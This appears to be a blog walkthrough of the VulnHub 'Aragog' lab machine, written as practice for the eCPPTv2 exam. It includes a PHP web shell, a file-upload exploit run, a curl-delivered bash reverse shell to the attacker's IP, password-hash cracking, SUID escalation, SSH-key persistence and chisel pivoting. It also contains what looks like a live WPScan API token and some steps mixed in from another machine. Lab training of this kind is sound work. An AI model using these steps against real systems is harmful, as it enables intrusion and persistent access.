---
layout: single
title: '<span class="vulnhub">eCCptV2 Simulation- /VulnHub</span>'
excerpt: "these are a machines from Vulnhub platform. I recommend you do these CTF because for the eCCptv2 it will be something like this."
date: 2023-04-22
categories:
  - certification
tags:  
  - wordpress
  - bruteforce
  - suid
  - privilege-escalation
  - web
  - php
  - reverse-shell
  - wpscan
  - hydra
  - linux
  - pivoting
  - Fuzzing
  - wpScan
toc: true
toc_label: "Content"
toc_sticky: true
show_time: true
---

Aragog,Nagini,Fawkes,Dumbledore-PC,matrix1, BrainPan are a machines from Vulnhub platform. I recommend you do these CTF because for the eCCptv2 it will be something like these cluster, another very strong point to mention is that works well doings these machine as pivoting machines if you don't know how to set the environment for the certification click [here](https://github.com/Zeekk3n/eccptv2-environment/blob/main/README.md)


**We will see all this from the perspective and methodology of a penetration test.**

- Links to the machines: [Aragog](https://www.vulnhub.com/entry/symfonos-31,332/),[nagini](https://www.vulnhub.com/entry/harrypotter-aragog-102,688/), [Fawkes](https://www.vulnhub.com/entry/harrypotter-fawkes,686/),[Dumbledore](https://www.mediafire.com/file/sluu2e0p0qtb9xx/Dumbledore-PC.rar/file), [matrix](https://www.vulnhub.com/entry/matrix-1,259/),[BrainPan](https://www.vulnhub.com/entry/brainpan-1,51/) 
- Difficulty assigned by Vulnhub: Medium
- The IP of the machine in my case will be: 192.168.100.65 (You will have a different ip so change it for all steps).

Let's get them!

## Enumeration

we have to figure out the ip of the machine so we need to use arp scan tool 
To do this we will make use of arp-scan and use a series of parameters that will make your search faster.

```bash
❯ arp-scan -Iens33 --localnet
```

The explanation of the meaning of each parameter is:
- ```-I-``` : We have to indicate our interface in my case will be ens33 in your case could be eth0.
- ```--localnet``` : We indicate that the search will be for our localnet.
output
```php
❯ arp-scan -Iens33 --localnet
Interface: ens33, type: EN10MB, MAC: 00:0c:29:f2:37:49, IPv4: 192.168.100.53
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.100.1	64:5e:10:84:35:47	(Unknown)
192.168.100.10	90:e8:68:d0:da:47	(Unknown)
192.168.100.4	8e:63:8c:7a:9f:b0	(Unknown: locally administered)
192.168.100.34	c4:03:a8:d9:4c:ca	(Unknown)
192.168.100.37	94:e6:f7:7a:1e:12	Intel Corporate
192.168.100.5	58:9a:3e:6e:27:40	(Unknown)
192.168.100.6	34:25:be:68:6f:95	(Unknown)
192.168.100.51	06:1f:61:f8:6e:4f	(Unknown: locally administered)
192.168.100.7	24:18:c6:dc:bd:cd	(Unknown)
192.168.100.65	00:0c:29:bd:7d:9e	VMware, Inc.
```
now we know the ip for the machine that we can reach, now we have to enumerate to figure out what kind of machine is based on the TTL which is time to life.
```bash
ping -c3 192.168.100.65
```
output:
```php
PING 192.168.100.65 (192.168.100.65) 56(84) bytes of data.
64 bytes from 192.168.100.65: icmp_seq=1 ttl=64 time=0.567 ms
64 bytes from 192.168.100.65: icmp_seq=2 ttl=64 time=0.270 ms
64 bytes from 192.168.100.65: icmp_seq=3 ttl=64 time=0.316 ms

--- 192.168.100.65 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2042ms
rtt min/avg/max/mdev = 0.270/0.384/0.567/0.130 ms
```

- ```-TTL-``` : means the time to life of the machine, if it's 64 the machine is Linux, or if it's 124 the machine will be windows.
- ```--3 packets transmitted, 3 received``` : with this output means that the machine is active.

The first thing we will do when you know the IP and when you know that the machine is active we have to scan the target and see which ports are open.
To do this we will make use of nmap and use a series of parameters that will make our scan faster.:

```bash
❯ nmap -p- -sS --open --min-rate 5000 -vvv -Pn -n 192.168.100.65 -oG allports
```
the meaning of each parameter is.:
- ```-p-``` : We indicate that the scan will be done for all ports.
- ```--open``` : We indicate that we are only interested in ports that are open.
- ```-sS``` : This flag indicates that we want to do a "SYN Scan" which means that the packets we will send will never complete the TCP connections and that will make our scan much less intrusive and quieter.
- ```-Pn``` : With this option we indicate that we do not want to do host discovery (since we know who our target is).
- ```--min-rate 5000``` : This flag can be exchanged for ```-T5```, both are intended to make our scanning faster (and noisier...). To be more detailed this flag indicates that we don't want to send less than 5,000 packets per second.
- ```-v``` : (verbose) To see which ports appear as we go along.
- ```-n``` : We don't want DNS resolution to be performed, since we are scanning an IP, not a domain.
output.

```php
❯ nmap -p- -sS --open --min-rate 5000 -vvv -Pn -n 192.168.100.65 -oG allports
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-20 11:32 CST
Initiating ARP Ping Scan at 11:32
Scanning 192.168.100.65 [1 port]
Completed ARP Ping Scan at 11:32, 0.03s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 11:32
Scanning 192.168.100.65 [65535 ports]
Discovered open port 80/tcp on 192.168.100.65
Discovered open port 22/tcp on 192.168.100.65
Completed SYN Stealth Scan at 11:32, 2.26s elapsed (65535 total ports)
Nmap scan report for 192.168.100.65
Host is up, received arp-response (0.00010s latency).
Scanned at 2023-04-20 11:32:45 CST for 2s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 00:0C:29:BD:7D:9E (VMware)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 2.43 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

At this point we know that there are 2 open ports: 80 (HTTP) and 22 (SSH), seeing this we have to make under consideration that we have 2 vias of get into the machine the SSH port and port 80 (at least to the outside), it can be deduced that the only way to enter the machine is through these services.

 once we know which ports are open we must perform the scan to those ports by running a series of scripts in order to obtain more information: server version, technology, possible vulnerabilities, etc...

```bash
❯ nmap -sC -sV -p22,80 192.168.100.65 -oN target
```


Where.:

- ```-sV``` : If possible, it will show the version of the service running on each port.
- ```-A``` : We will run all relevant scripts (provided by nmap) on these ports.
- ```-p 80,22,21```: Open ports.
- ```-oN```: export the output to nmap format

Getting this output:

```php
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-20 11:33 CST
Nmap scan report for 192.168.100.65
Host is up (0.00044s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 48df48372594c4746b2c6273bfb49fa9 (RSA)
|   256 1e3418175e17958f702f80a6d5b4173e (ECDSA)
|_  256 3e795f55553b127596b43ee3837a5494 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 00:0C:29:BD:7D:9E (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.88 seconds
```

To find out what we are dealing with, we will run **WhatWeb** in order to find the codename as well.

```bash
http://192.168.100.65 [200 OK] Apache[2.4.38], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[192.168.100.65]
```

seems that does not give us a lot of information.

So let's visit the the port 80 which is a page.


After testing each of the attacks SSRF,SQLI,PATHtraversal I did not find anything relevant, on the other hand we are able to search for possible routes using gobuster for example

Since there seems to be no more information in sight, we will proceed to do *Fuzzing*, which consists of making requests to the server of several routes extracted from a dictionary with the objective of obtaining routes that exist. For this we will use *goBuster* although another powerful tool is *Ffuf* or wFuzz.

- With wfuzz would be:

```bash
wfuzz -c -L --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://192.168.100.61///FUZZ
```

- With ffuf would be:

```bash
ffuf -u http://192.168.100.61//FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -mc 200 -c -t 200
```
- With gobuster would be:
```bash
gobuster dir -u http://192.168.100.61/ -w /usr/share/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 --add-slash
```

At this point we found the following routes:

```
/javascript           (Status: 301) [Size: 321] [--> http://192.168.100.65/javascript/]
/blog                 (Status: 301) [Size: 315] [--> http://192.168.100.65/blog/]      
/server-status        (Status: 403) [Size: 279] 
```

let's enumerate it via wpSCAN in order to find vulneral plugins and potential vias to get in to the machine for example.

```php
[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
```

according with the output we don't find anything, so let's register and try again with the api token.

```bash
 wpscan --url http://192.168.100.65/blog/ --enumerate u,vp --plugins-detection aggressive --api-token=yocj0asWxCFcZvF1sdI9ocg10i7x5sDnwtZsXYhvIMuVszR23h2VIF1A
```
seems that we found some vulnerabilyties with the api token, that the page of WSPscan gave us.

```php
 | [!] 3 vulnerabilities identified:
 |
 | [!] Title: File Manager < 6.5 - Backup File Directory Listing
 |     Fixed in: 6.5
 |     References:
 |      - https://wpscan.com/vulnerability/49533dc2-17cb-459c-af28-69a7b9b9512f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-24312
 |      - https://zeroaptitude.com/zerodetail/wordpress-plugin-bug-hunting-part-1/
 |      - https://plugins.trac.wordpress.org/changeset/2326268/wp-file-manager
 |
 | [!] Title: File Manager 6.0-6.9 - Unauthenticated Arbitrary File Upload leading to RCE
 |     Fixed in: 6.9
 |     References:
 |      - https://wpscan.com/vulnerability/e528ae38-72f0-49ff-9878-922eff59ace9
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-25213
 |      - https://blog.nintechnet.com/critical-zero-day-vulnerability-fixed-in-wordpress-file-manager-700000-installations/
 |      - https://www.wordfence.com/blog/2020/09/700000-wordpress-users-affected-by-zero-day-vulnerability-in-file-manager-plugin/
 |      - https://seravo.com/blog/0-day-vulnerability-in-wp-file-manager/
 |      - https://blog.sucuri.net/2020/09/critical-vulnerability-file-manager-affecting-700k-wordpress-websites.html
 |      - https://twitter.com/w4fz5uck5/status/1298402173554958338
 |
 | [!] Title: WP File Manager < 7.1 - Reflected Cross-Site Scripting (XSS)
 |     Fixed in: 7.1
 |     References:
 |      - https://wpscan.com/vulnerability/1cf3d256-cf4b-4d1f-9ed8-e2cc6392d8d8
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24177
 |      - https://n4nj0.github.io/advisories/wordpress-plugin-wp-file-manager-i/
 |      - https://plugins.trac.wordpress.org/changeset/2476829/
```

- we have to use them using the URL's that we recived from the [output](https://wpscan.com/vulnerability/e528ae38-72f0-49ff-9878-922eff59ace9). now we have to wget that proof of concept.

```bash
wget https://ypcs.fi/misc/code/pocs/2020-wp-file-manager-v67.py
 ```
 something to consider is that after we analizy the code in the line 72 according with it the script is calling "payload.php" so we must to create before we execute this script.
 
 ```bash
 nvim payload.php
❯ cat payload.php
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: payload.php
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ <?php
   2   │ echo "<pre>" . shell_exec($_REQUEST['cmd'])  .  "</pre";
   3   │ ?>
───────┴──────

 ```
 after we save it we must execute it using python3, example.
 
 ```bash
python3 2020-wp-file-manager-v67.py http://192.168.100.65/blog
 ```
 output
  ```bash
200
Success!?
http://192.168.100.65/blog/blog/wp-content/plugins/wp-file-manager/lib/php/../files/payload.php 
 ```
 now we have to copy the output called "http://192.168.100.65/blog/blog/wp-content/plugins/wp-file-manager/lib/php/../files/payload.php " an delete 1 blog
 example.
  ```bash
http://192.168.100.65/blog/wp-content/plugins/wp-file-manager/lib/php/../files/payload.php 
 ```
 now we have to use the page with the url before insert commands, in order to use the payload that we injected for example.
  ```bash
❯ curl -s -X GET "http://192.168.100.65/blog/wp-content/plugins/wp-file-manager/lib/files/payload.php?"   
 ```
 now we can insert commands.
```bash
❯ curl -s -X GET "http://192.168.100.65/blog/wp-content/plugins/wp-file-manager/lib/files/payload.php?cmd=whoami"
<pre>www-data
</pre#     
```
 
 
 ## Exploitation
 

let's take an advantage of ```RCE```, using the RCE that we seted before.


```
from our machine we have to 
nc -nlvp 443
```
so if we are able to execute commands let's make a [reverse shell](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) here's a list of it if you don't how to make it.

```
❯ curl -s -X GET "http://192.168.100.65/blog/wp-content/plugins/wp-file-manager/lib/files/payload.php?cmd=bash -c "bash -i >%26 /dev/tcp/192.168.100.53/443 0>%261"

```


and on your own machine you have to stay hearing on port 443  ```nc -nlvp 443```, in order to make the connection successfully.

## Privilage Escalation

now that we gain access we have to do the treatment of the TTY because if we don't do it, we will be unable to execute shorcuts such as CTRL + C or CTRL + L or the stty size
let's make it ! press enter to go back to your reverse shell.
first we need to execute this script.

- ```-script /dev/null -c bash``` : change the value of the TTY.
- ```-Ctrl + z``` : end  the session of our reverse shell (for a while).
- ```-stty raw -echo;fg```: from our machine we have to change it.
- ```-export TERM=xterm```: change the value of the XTERM.
- ```-stty size```: now you have to verify your rows and columns from your personal desktop. in order to replace them in your reverse shell.
- ```-stty size```: verify you rows and columns.
- ```-stty rows {} columns {}```: change your rows and columns.

Let's find SUID permissions.

```bash
cerberus@symfonos3:/$ find \-perm -4000 -user root 2>dev/null
./usr/sbin/exim4
./usr/bin/newgrp
./usr/bin/chsh
./usr/bin/pkexec
./usr/bin/chfn
./usr/bin/gpasswd
./usr/bin/passwd
./usr/lib/eject/dmcrypt-get-device
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/openssh/ssh-keysign
./bin/umount
./bin/mount
./bin/ping
./bin/su
```
seems that we can not take root from here, but how we have wordpress we can use find possible passwords in /var/www/html.

```
www-data@Aragog:/var/www/html$ ls
harry_potter_1.jpg  index.html
```
seems that we can not take root from here, another potential way is to find in apache directory.

```
www-data@Aragog:/var$ cat /etc/apache2/sites-enabled/wordpress.conf 
Alias /blog /usr/share/wordpress
<Directory /usr/share/wordpress>
    Options FollowSymLinks
    AllowOverride Limit Options FileInfo
    DirectoryIndex index.php
    Order allow,deny
    Allow from all
</Directory>
<Directory /usr/share/wordpress/wp-content>
    Options FollowSymLinks
    Order allow,deny
    Allow from all
</Directory>
```

and seems that all the wordpress is in /usr/share/wordpress so let's get into it.

```bash
} elseif (file_exists("/etc/wordpress/config-default.php
```

according with this file all crendials are in file default.

```bash
www-data@Aragog:/usr/share/wordpress$  cat /etc/wordpress/config-default.php
<?php
define('DB_NAME', 'wordpress');
define('DB_USER', 'root');
define('DB_PASSWORD', 'mySecr3tPass');
```

we will use this pass that we found in mysql, because for hagrid and the others users did not work for me.

```bash
myseql -uroot -p
Enter password: mySecr3tPass

```

now we have to search for Dbs.
example.

```php
 MariaDB [(none)]> show databases;  
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| wordpress          |
```
now for tables.

```php
use wordpress  
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [wordpress]> show tables;
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
| wp_wpfm_backup        |
+-----------------------+
```
now for columns.

```php
MariaDB [wordpress]> describe wp_users;
+---------------------+---------------------+------+-----+---------------------+----------------+
| Field               | Type                | Null | Key | Default             | Extra          |
+---------------------+---------------------+------+-----+---------------------+----------------+
| ID                  | bigint(20) unsigned | NO   | PRI | NULL                | auto_increment |
| user_login          | varchar(60)         | NO   | MUL |                     |                |
| user_pass           | varchar(255)        | NO   |     |                     |                |
| user_nicename       | varchar(50)         | NO   | MUL |                     |                |
| user_email          | varchar(100)        | NO   | MUL |                     |                |
| user_url            | varchar(100)        | NO   |     |                     |                |
| user_registered     | datetime            | NO   |     | 0000-00-00 00:00:00 |                |
| user_activation_key | varchar(255)        | NO   |     |                     |                |
| user_status         | int(11)             | NO   |     | 0                   |                |
| display_name        | varchar(250)        | NO   |     |                     |                |
+---------------------+---------------------+------+-----+---------------------+----------------+
10 rows in set (0.001 sec)

```

now we will search for the information of the user.
```bash
select * from wp_users;
+----+------------+------------------------------------+---------------+--------------------------+----------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email               | user_url | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+--------------------------+----------+---------------------+---------------------+-------------+--------------+
|  1 | hagrid98   | $P$BYdTic1NGSb8hJbpVEMiJaAiNJDHtc. | wp-admin      | hagrid98@localhost.local |          | 2021-03-31 14:21:02 |                     |           0 | WP-Admin     |
+----+------------+------------------------------------+---------------+--------------------------+----------+---------------------+---------------------+-------------+--------------+
1 row in set (0.001 sec)

```
now we will execute a brute force attack in order to figure out what's the password for hash "$P$BYdTic1NGSb8hJbpVEMiJaAiNJDHtc." using john and seclist.
```bash
❯ john -w:rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password123      (?)
1g 0:00:00:00 DONE (2023-04-20 15:49) 7.692g/s 11815p/s 11815c/s 11815C/s 753951..mexico1
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed
```
according with john the password is password123.
now we have to figure out who is the owner of this password we have 2 potentials options.
```bash
www-data@Aragog:/home$ ls
ginny  hagrid98
```
so how we saw the port 22 is open so.
```bash
❯ ssh ginny@192.168.100.65
The authenticity of host '192.168.100.65 (192.168.100.65)' can't be established.
ECDSA key fingerprint is SHA256:Xy+Xj3BR8BLS4rk/l2jfAZmSh0d3m5zJXaB5QsUT3AA.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.100.65' (ECDSA) to the list of known hosts.
ginny@192.168.100.65's password: 
Permission denied, please try again.
ginny@192.168.100.65's password:

❯ ssh hagrid98@192.168.100.65
hagrid98@192.168.100.65's password: 
Linux Aragog 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
hagrid98@Aragog:~$ 
```
that is how we gained access to this user called hagrid.
```bash
hagrid98@Aragog:~$ whoami
hagrid98

first flag

❯ echo "MTogUmlkRGxFJ3MgRGlBcnkgZEVzdHJvWWVkIEJ5IGhhUnJ5IGluIGNoYU1iRXIgb2YgU2VDcmV0cw==" | base64 -d; echo
1: RidDlE's DiAry dEstroYed By haRry in chaMbEr of SeCrets
```
using hagrid98 user let's find SUID binaries.
```bash
hagrid98@Aragog:/$ find \-perm -4000 -user root 2>dev/null
./usr/bin/newgrp
./usr/bin/chfn
./usr/bin/mount
./usr/bin/su
./usr/bin/passwd
./usr/bin/chsh
./usr/bin/gpasswd
./usr/bin/umount
./usr/lib/openssh/ssh-keysign
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/eject/dmcrypt-get-device
```
in this case we could'nt find anything so, let's search for the hagrid user.

```bash
hagrid98@Aragog:/$ find \-user hagrid98 2>/dev/null
./proc/2923/patch_state
./opt/.backup.sh

```
and we found something let's reasearch it in order to find vulnerabilities.

```bash
hagrid98@Aragog:/$ ls -l ./opt/.backup.sh 
-rwxr-xr-x 1 hagrid98 hagrid98 81 Apr  1  2021 ./opt/.backup.sh
```
seems that we can take an adventage of it so let's get it.

```bash
#!/bin/bash

cp -r /usr/share/wordpress/wp-content/uploads/ /tmp/tmp_wp_uploads 
hagrid98@Aragog:/$ 
```


```bash
hagrid98@Aragog:/$ ls -l /tmp
total 12
drwx------ 3 root root 4096 Apr 20 22:48 systemd-private-1a2aa0f64ccf4c09ab8cccd32f19c626-apache2.service-Rl55VT
drwx------ 3 root root 4096 Apr 20 22:48 systemd-private-1a2aa0f64ccf4c09ab8cccd32f19c626-systemd-timesyncd.service-l9HIoe
drwxr-xr-x 5 root root 4096 Apr 20 22:52 tmp_wp_uploads
```

```bash
  GNU nano 3.2                                                                                                         /opt/.backup.sh                                                                                                                    

#!/bin/bash

cp -r /usr/share/wordpress/wp-content/uploads/ /tmp/tmp_wp_uploads 


chmod u+s /bin/bash

```
now if everything works we just have to monitoring the bash using watch command.

```bash
hagrid98@Aragog:/$ watch -n 1 ls -l /bin/bash
-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
```
and now the permission changed rwsr, we just have to change the privilages of the bash using bash -p.
.
```bash
hagrid98@Aragog:/$ bash -p
bash-5.0# whoami
root
```
flag

```bash
bash-5.0# cd /root/
bash-5.0# ls
horcrux2.txt
bash-5.0# cat horcrux2.txt 
  ____                            _         _       _   _                 
 / ___|___  _ __   __ _ _ __ __ _| |_ _   _| | __ _| |_(_) ___  _ __  ___ 
| |   / _ \| '_ \ / _` | '__/ _` | __| | | | |/ _` | __| |/ _ \| '_ \/ __|
| |__| (_) | | | | (_| | | | (_| | |_| |_| | | (_| | |_| | (_) | | | \__ \
 \____\___/|_| |_|\__, |_|  \__,_|\__|\__,_|_|\__,_|\__|_|\___/|_| |_|___/
                  |___/                                                   


Machine Author: Mansoor R (@time4ster)
Machine Difficulty: Easy
Machine Name: Aragog 
Horcruxes Hidden in this VM: 2 horcruxes

You have successfully pwned Aragog machine.
Here is your second hocrux: horcrux_{MjogbWFSdm9MbyBHYVVudCdzIHJpTmcgZGVTdHJPeWVkIGJZIERVbWJsZWRPcmU=}




# For any queries/suggestions feel free to ping me at email: time4ster@protonmail.com

bash-5.0# 
```


- ```-cerberus@symfonos3:/tmp$ id
uid=1001(cerberus) gid=1001(cerberus) groups=1001(cerberus),33(www-data),1003(pcap)```

another flag.
- ```MjogbWFSdm9MbyBHYVVudCdzIHJpTmcgZGVTdHJPeWVkIGJZIERVbWJsZWRPcmU= ```
- decodificated "2: maRvoLo GaUnt's riNg deStrOyed bY DUmbledOre"


now let's find another machines because if we are able to watch another interface it's because theres other machines in to this environment.

```bash
bash-5.0# hostname -I
10.10.0.136 192.168.100.65 
bash-5.0# 
```



## Enumeration | Pivoting 10.10.0.?

-using my tool [HostDiscovery](https://zeekk3n.github.io/andrey.github.io/project-host-discovery/#) we will search for more IP/interfaces

first of all we need to verify which interfaces we are able to enumerate.

```bash
bash-5.0# ./hostdiscovery.sh 
[+] host 10.10.0.1 - is ACTIVE
[+] host 10.10.0.137 - is ACTIVE
[+] host 10.10.0.136 - is ACTIVE
```
it looks like we can enumerate host 10.10.0.137, let's use my tool in order to find open ports  [PortScanner](https://zeekk3n.github.io/andrey.github.io/project-portscanner/#)


```bash
bash-5.0# ./PortScanner.sh 
[+] Port 22 - is OPEN
[+] Port 80 - is OPEN
^C

[!] getting out that here...
```




ow we know the ip for the machine that we can reach, now we have to enumerate to figure out what kind of machine is based on the TTL which is time to life.
```bash
ping -c3 192.168.100.65
```
output:
```php
PING 192.168.100.65 (192.168.100.65) 56(84) bytes of data.
64 bytes from 192.168.100.65: icmp_seq=1 ttl=64 time=0.567 ms
64 bytes from 192.168.100.65: icmp_seq=2 ttl=64 time=0.270 ms
64 bytes from 192.168.100.65: icmp_seq=3 ttl=64 time=0.316 ms

--- 192.168.100.65 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2042ms
rtt min/avg/max/mdev = 0.270/0.384/0.567/0.130 ms
```

- ```-TTL-``` : means the time to life of the machine, if it's 64 the machine is Linux, or if it's 124 the machine will be windows.
- ```--3 packets transmitted, 3 received``` : with this output means that the machine is active.

SSH keys
how we found another machine that we are able to do pivoting let's make persistance with ssh keys in case if we need to bring back again to hagridMachine


```bash
we need to create a ssh key pb/priv with ssh-keygen + enter +enter +enter
ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/.ssh/id_rsa
Your public key has been saved in /root/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:EUYJiyL0tlLt5yjqlNHxbyKYX/kfkmmeQrzbDlmdvyE root@parrot
The key's randomart image is:
+---[RSA 3072]----+
| .    .o+.       |
|. . .. o..       |
|. .=... .        |
| .+.=   ...      |
| o o.o oSo       |
|  *  oO o .      |
| = o.B.O E o     |
|. o +oO o o o    |
|.o . .+*.. .     |
+----[SHA256]-----+
```
now we have to check the output
```bash
cat ~/.ssh/id_rsa.pub
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: /root/.ssh/id_rsa.pub
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCx3N+ZKQLTQIgqGkcpWZcxbt6j4/qTj4dmyyDtu6w7zyMVKsAFqJj6EGEqWYd8tysgM3O7ds7EAnRAwey1w6oEpQ0YmzVvWE1Ose/FuxSu8UVTZ8Kq/dwzIuANcrNYpS6TAvx0VsCnsdNUNLqhcCXWu3cX/7ocUUczHaO/z/Q2Nql4AUL1isOg/4Y/NpVaQG26y4tmB55
       │ COIVXBnikNltrxTeym2/9WtHhB2ev0UuJZstU7eFXwqfD15SBv31IezQGY6MaXUSdEjORWVb6vDZLcstK22IqrLGCuyn0GquKCdg8JWx8mxQYGrxz9jF2RGm/tsiVi+9rXaFDVQhx2hhRK000OWhD8YtbEGXTi5jYJgzSXSjMuz4u62bk+lVgXS1S2Fnauz4f1vGFJHacxUPQY9q0Yswe4n6t0soNDB3Dm6SDebRDXLF6x0
       │ I50SzsBWDdmcbEM1wHZ0xOfDO2L/M2ILOCnWqg0WNkS5nQ5IDeXqoFqcZVFsP+RmNht3uAjgU= root@parrot
```

in order to copy + paste and remove the spaces between each line

```bash
❯ cat ~/.ssh/id_rsa.pub | tr -d '\n' | xclip -sel clip
```
now we have to paste it in /root/.ssh on (hagrid98) machine 

```bash
bash-5.0# cd /root/.ssh/
bash-5.0# ls
bash-5.0# nano authorized_keys
```
paste it 
and let's verify if it works
from our machine let's use ssh
```bash
❯ ssh root@192.168.100.65
Linux Aragog 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@Aragog:~# 
```


now we have to use chisel in order to create a tunneling to use the tools that we have in our own machine 
such as Nmap and to scan ports such as 80 and 22 that we saw them open 

first of all we need to get chisel from [github](https://github.com/jpillora/chisel/releases/tag/v1.8.1)
save it in the directory download and share it using a server with python3 


```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

from the machine that we obtained root before we have to wget it and give it permissions of execution.
```bash
bash-5.0# wget 192.168.100.53:80/chisel.sh
--2023-04-21 22:04:56--  http://192.168.100.53/chisel.sh
Connecting to 192.168.100.53:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3354732 (3.2M) [text/x-sh]
Saving to: 'chisel.sh'

chisel.sh                       100%[====================================================>]   3.20M  --.-KB/s    in 0.04s   

2023-04-21 22:04:56 (73.7 MB/s) - 'chisel.sh' saved [3354732/3354732]

bash-5.0# ls
chisel.sh
bash-5.0# chmd^C
bash-5.0# chmod +x chisel.sh 
```
now we have to execute from our machine using a server mode and sock5 connection in order to visualize all ports for example 

```bash
./chisel.sh server --reverse -p 1234
2023/04/21 10:41:21 server: Reverse tunnelling enabled
2023/04/21 10:41:21 server: Fingerprint mJhxosRnafmGDz5dRSAPLQJ0fJ2Tl6xgN8ZUr0/ddHM=
2023/04/21 10:41:21 server: Listening on http://0.0.0.0:1234
2023/04/21 10:42:59 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```
and from the machine that we obtained root before we have to use it as client for example 
```bash
bash-5.0# ./chisel.sh client 192.168.100.53:1234 R:socks
```
in order to use this tunneling we will use proxychains to do this we have to change some setting here
we have to open proxychains conf in order to add our connection via sock5
example 


nvim /etc/proxychains.conf   
```bash
nvim /etc/proxychains.conf  
```
scroll down and add

```bash
socks5 127.0.0.1 1080  
```

now let's verify if it worked using nmap in order to enumerate the ports open that we saw using my PorScanner.sh.in this case we will take adventage of the tunning and nmap using proxychains

```bash
❯ proxychains nmap -sT -Pn --top-ports 500 -open -T5 -v -n 10.10.0.137 2>/dev/null | grep  -vE "timeout"
ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-20 21:31 CST
Initiating Connect Scan at 21:31
Scanning 10.10.0.137 [500 ports]
Discovered open port 80/tcp on 10.10.0.137
Discovered open port 22/tcp on 10.10.0.137
Completed Connect Scan at 21:31, 2.29s elapsed (500 total ports)
Nmap scan report for 10.10.0.137
Host is up (0.0038s latency).
Not shown: 498 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
we must use -sT and -Pn parameters because we are using a tunneling type socks 5 in order to avoid problems

we saw port 22 and 80 so we have to enumerate that service on port 80 but we are not able to see it unless we use foxyProxy and add it as our local host 

